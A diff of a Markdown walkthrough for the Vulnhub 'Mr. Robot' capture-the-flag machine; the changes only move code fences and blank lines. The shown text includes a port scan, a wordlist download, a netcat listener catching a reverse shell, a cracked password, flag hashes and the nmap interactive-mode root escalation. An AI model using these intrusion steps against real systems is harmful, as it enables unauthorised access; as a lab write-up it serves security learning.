@@ -23,8 +23,8 @@ PORT    STATE  SERVICE
 443/tcp open   https
 
 Nmap done: 1 IP address (1 host up) scanned in 15.96 seconds
-```
 
+```
 
 Goodie it looks like we have a webserver. After browsing to the site you will find a very nicely done webpage devoted
 to Mr.Robot, or as some may know him Elliot, that you can devulge a lot of time into but thats not where we want to focus. The first thing you should do when looking at a website
@@ -35,8 +35,8 @@ First lets take a look at fsocity.dic, judging from the name this is probably a 
 
 ```
 wget 192.168.1.168/fsocity.dic
-```
 
+```
 
 Note: Your I.P. will probably be different.
 
@@ -119,8 +119,8 @@ uid=1(daemon) gid=1(daemon) groups=1(daemon)
 $ whoami
 daemon
 $
-```
 
+```
 
 After getting this shell I decided to checkout the home folder. After arriving here I saw the key-2-of-2.txt file and got very excited! However,
 after trying to cat it I realized I did not have permission to read it. I did notice there was a md5 password file for user robot (whos
@@ -129,11 +129,11 @@ only took seconds and I got the password of
 
 ```
 abcdefghijklmnopqrstuvwxyz
+
 ```
 So at this point I tried to su robot and kept getting a not in terminal error. I figured this had something to do with TTY so I did a quick
 google search that led me to another article on pentestmonkey with a python command to open up a terminal. Below is going to be the log of
 everything I did to get key to after gaining access to the machine besides the cracking of the md5 hash since that was not done in the terminal
-
 
 ```
 $ nc -lvnp 1234
@@ -157,8 +157,8 @@ robot@linux:~$ cat key-2-of-3.txt
 cat key-2-of-3.txt
 822c73956184f694993bede3eb39f959
 robot@linux:~$
-```
 
+```
 
 After searching around the box a bit and looking at the SUID binaries I remembered an old flaw with Nmap that allowed a user to execute commands as
 root in interactive mode. After launching the interactive mode you can enter !sh to gain a shell. At this point I navigated to the root directory
@@ -178,8 +178,8 @@ cd /root/
 cat key-3-of-3.txt
 04787ddef27c3dee1ee161b21670b4e4
 #
-```
 
+```
 
 That just about wraps up this Vulnhub image. Hopefully everyone enjoys my first writeup for Vulnhub. I am still fairly new at CTFs and boot2root
 machines but I plan on doing a lot more of these and to continue writing writeups! If anyone has any suggestions on
